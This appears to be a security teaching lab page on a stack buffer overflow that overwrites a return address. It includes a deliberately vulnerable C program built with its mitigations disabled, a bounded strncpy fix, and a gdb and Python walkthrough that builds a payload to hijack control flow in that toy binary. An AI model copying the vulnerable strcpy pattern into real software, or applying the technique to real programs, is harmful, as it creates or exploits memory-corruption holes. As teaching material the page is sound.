CSS-LAB-BOA / level 07

Return-Address OverwriteBONUS

The deepest level in this lab: redirecting a program's execution entirely, by overwriting the one piece of memory that decides what runs next.

1. Overview & Vulnerability Theory

The vulnerable function

strcpy(buffer, input) — same bug as Level 02, different consequence — identical to Level 02's vulnerability in mechanism. What's different here is what sits in memory immediately after the buffer, and what compiler mitigations have been deliberately disabled to make that consequence observable.

Why it fails at the memory level

In Levels 01-06, the overflow corrupts a value. Here, with the stack canary disabled (-fno-stack-protector) and position-independent execution disabled (-fno-pie -no-pie), an overflow sized and positioned precisely enough reaches the saved return address itself — the value the CPU pops and jumps to when the current function returns. Overwrite it with the address of a function that was never legitimately called, and that function runs anyway.

higher addresses ┌─────────────────────────┐ │ saved return addr (RIP) │ <- THE TARGET: overwrite this │ / link register (LR/x30 on AArch64) │ ├─────────────────────────┤ │ saved base pointer │ <- overflow passes through here first ├─────────────────────────┤ │ char buffer[16] │ <- strcpy writes here, unbounded └─────────────────────────┘ lower addresses Payload shape: [ N bytes of filler to reach the return address ] + [ target address, packed little-endian ]

Classification

CWE-787 / CWE-121 — CWE-787 (Out-of-bounds Write) escalated to full control-flow hijack; CWE-121 specifically covers stack-based buffer overflow as the delivery mechanism for return-address corruption.

Normal execution

Malicious input

$ /tmp/07-bonus-redirect-vuln "$(cat /tmp/payload)"

# No ASan here by design -- the canary and PIE are off specifically so
# this succeeds rather than being caught. See the walkthrough below for
# how /tmp/payload is actually constructed.

Reading the ASan trace, line by line

No ASan trace in this level
Deliberate: ASan and this exploit are mutually exclusive demonstrations. ASan's redzones would catch the overflow before it ever reached the return address. This level trades detection for exploitation -- showing what ASan exists to prevent.
secret_win() reached
The entire proof of success. The function was compiled in but is never called anywhere in main() or vulnerable_read() -- if it runs, execution was genuinely redirected, not just coincidentally reached.

3. The Secure Rewrite

vuln.c

#include <stdio.h>
#include <string.h>

__attribute__((noinline))
void secret_win(void) {
    printf("\n*** secret_win() reached -- "
           "control flow redirected ***\n\n");
}

__attribute__((noinline))
void vulnerable_read(char *input) {
    char buffer[16];
    strcpy(buffer, input);
    /* VULNERABLE, canary/PIE disabled
       at compile time */
    printf("Buffer: %s\n", buffer);
}

int main(int argc, char *argv[]) {
    if (argc < 2) return 1;
    vulnerable_read(argv[1]);
    printf("Returned safely (no redirect).\n");
    return 0;
}

secure.c

#include <stdio.h>
#include <string.h>

void secret_win(void) {
    printf("\n*** secret_win() reached ***\n\n");
}

void secure_read(char *input) {
    char buffer[16];
    strncpy(buffer, input, sizeof(buffer) - 1);
    buffer[sizeof(buffer) - 1] = '\0';
    printf("Buffer: %s\n", buffer);
}

int main(int argc, char *argv[]) {
    if (argc < 2) return 1;
    secure_read(argv[1]);
    printf("Returned safely.\n");
    return 0;
}

What changed, and why it's actually safe

Identical fix to Level 02: strncpy() bounded to the buffer's actual size. The overflow never has anywhere near enough room to reach the return address, regardless of whether the canary, PIE, or NX are enabled or disabled -- the fix makes those mitigations irrelevant here rather than depending on them.

Proof: same malformed input, secure build

$ /tmp/secure "$(cat /tmp/payload)"
Buffer: AAAAAAAAAAAAAAA
Returned safely.
# secret_win() is architecturally unreachable -- the overflow never
# travels far enough to touch anything past buffer's 15 usable bytes.

4. Advanced Walkthrough — Control-Flow Hijack

Read docs/HARDENING.md before running this. Every offset and address below is valid for exactly the one build that produced it. This is a local debugging artifact, not a portable exploit technique — see the ASLR/environment-drift discussion at the end of this section.

Step 1 — Disassemble and locate the target

$ gdb /tmp/07-bonus-redirect-vuln
(gdb) disassemble vulnerable_read
(gdb) print secret_win
$1 = {void (void)} 0x4009... <secret_win>

The noinline attribute on both functions (see the vuln.c above) matters here — without it, the compiler might fold secret_win() into nothing if it looks unreachable, or inline vulnerable_read() into main(), muddying the clean disassembly this walkthrough depends on.

Step 2 — Find the exact offset to the return address

Never guess this by eye, and never trust a number copied from someone else's run. This project ships a proper de Bruijn cyclic-pattern script specifically so the offset is derived, not assumed:

$ python3 scripts/find_offset.py /tmp/07-bonus-redirect-vuln
[*] Running with a 200-byte de Bruijn pattern...
[+] pc = 0x... -> offset 24 into the pattern

On AArch64 specifically, the return address lives in the link register x30, spilled to the stack in the function's prologue — not at a fixed, architecture-independent offset the way RIP is on x86-64. The script's output accounts for this by reading whichever register (pc, lr, rip, or x30) actually appears in gdb's crash state, rather than assuming one architecture.

Step 3 — Craft the payload

$ python3 -c "
import struct, sys
offset = 24          # from Step 2's actual output, not copied from here
addr = 0x4009XX       # from Step 1's actual 'print secret_win' output
payload = b'A' * offset + struct.pack('<Q', addr)
sys.stdout.buffer.write(payload)
" > /tmp/payload

$ /tmp/07-bonus-redirect-vuln "$(cat /tmp/payload)"

struct.pack('<Q', addr) packs the target address as an 8-byte little-endian value, matching how x86-64 and AArch64 both store addresses in memory. On a 32-bit target this would be '<I' and 4 bytes instead — find_offset.py accepts a width argument for exactly this case.

Why hardcoded offsets fail in the real world

Everything above was derived fresh, for one specific compiled binary, on one specific machine, in one specific gdb session. Four things break it immediately outside that exact context:

  • ASLR — address space layout randomization means the stack's base address (and therefore every absolute address on it) differs on every single run, on any system where it's enabled. This level works only because ASLR is off inside this specific sandbox container for this specific exercise.
  • PIE — position-independent executables load at a randomized base address each run, same problem as ASLR but for the binary's own code addresses, including secret_win()'s. -no-pie is what makes print secret_win's address usable at all here.
  • Environment and argv drift — environment variables and argv strings are themselves placed on the stack before your program's frames, and their size and content shift the exact offset to everything below them. Running the identical binary with a different PATH or a different shell can change the offset found in Step 2.
  • Compiler, optimization level, and architecture — a different gcc version, -O2 instead of -O0, or a different CPU architecture entirely changes stack layout, calling convention, and frame structure. The offset found here has no claim to validity anywhere else.

None of this is a flaw in the demonstration — it's the actual point. A real attacker without local shell access to the target, without the ability to disable its mitigations, and without an existing information leak to defeat ASLR cannot replicate this. Modern exploitation against a hardened target requires substantially more — typically a memory-disclosure bug to leak a real address, combined with return-oriented programming (ROP) to work around a non-executable stack. Neither is in scope for this lab.
